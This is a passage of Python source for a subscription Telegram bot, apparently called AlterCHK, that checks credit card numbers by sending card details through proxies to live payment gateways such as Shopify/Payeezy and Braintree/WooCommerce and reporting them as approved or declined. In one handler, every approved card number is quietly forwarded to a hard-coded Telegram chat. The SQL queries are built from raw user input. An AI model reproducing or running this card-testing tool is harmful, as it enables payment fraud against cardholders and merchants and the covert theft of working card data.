    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsy import ShopifyPayeezy
        CheckRecive = await ShopifyPayeezy(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["pez"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Pezcary [ CCN Auth ]'
    TwoNameGateway = 'Gateway ↯ Pezcary [ CCN Auth ]'
    ThreeGateway = 'Gateway 🔥 Pezcary [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pez')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDpez3 import BraintreeWoo
        CheckRecive = await BraintreeWoo(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>CC - ↯ <code>{CcVerify}</code>\nChecked by - ↯ {UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ti"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Tilin [ CCN 10$ ]'
    TwoNameGateway = 'Gateway ↯ Tilin [ CCN 10$ ]'
    ThreeGateway = 'Gateway 🔥 Tilin [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ti')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
